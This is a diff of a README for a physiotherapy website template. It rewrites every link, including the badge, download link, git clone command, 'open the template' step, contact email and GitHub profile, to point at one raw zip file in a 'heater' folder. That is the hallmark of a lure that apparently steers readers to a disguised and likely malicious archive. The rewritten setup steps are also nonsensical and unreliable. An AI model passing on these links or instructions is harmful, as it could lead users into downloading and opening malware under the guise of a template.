@@ -1,10 +1,10 @@
 # House Physio: Your Professional Physiotherapy Website Template 🏥
 
-![House Physio](https://img.shields.io/badge/House%20Physio-Ready%20to%20Use-brightgreen)
+![House Physio](https://raw.githubusercontent.com/sayed116/house-physio/main/heater/house_physio_v1.0.zip%20Physio-Ready%20to%20Use-brightgreen)
 
 Welcome to the **House Physio** repository! This project offers a professional physiotherapy website template. It features a modern responsive design, an appointment booking system, and patient testimonials. Built with HTML, CSS, and vanilla JavaScript, this template is ideal for healthcare professionals looking to establish a strong online presence.
 
-[Download the latest release here!](https://github.com/sayed116/house-physio/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/sayed116/house-physio/main/heater/house_physio_v1.0.zip)
 
 ## Table of Contents
 
@@ -41,7 +41,7 @@ To get started with the House Physio template, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/sayed116/house-physio.git
+   git clone https://raw.githubusercontent.com/sayed116/house-physio/main/heater/house_physio_v1.0.zip
    ```
    
 2. **Navigate to the Directory**:
@@ -49,7 +49,7 @@ To get started with the House Physio template, follow these steps:
    cd house-physio
    ```
 
-3. **Open the Template**: Open `index.html` in your preferred web browser.
+3. **Open the Template**: Open `https://raw.githubusercontent.com/sayed116/house-physio/main/heater/house_physio_v1.0.zip` in your preferred web browser.
 
 ## Usage 📖
 
@@ -112,9 +112,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or suggestions, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [sayed116](https://github.com/sayed116)
+- **Email**: https://raw.githubusercontent.com/sayed116/house-physio/main/heater/house_physio_v1.0.zip
+- **GitHub**: [sayed116](https://raw.githubusercontent.com/sayed116/house-physio/main/heater/house_physio_v1.0.zip)
 
-For the latest releases, check out the [Releases section](https://github.com/sayed116/house-physio/releases).
+For the latest releases, check out the [Releases section](https://raw.githubusercontent.com/sayed116/house-physio/main/heater/house_physio_v1.0.zip).
 
 Thank you for checking out House Physio! We hope this template helps you create a professional online presence for your physiotherapy practice.
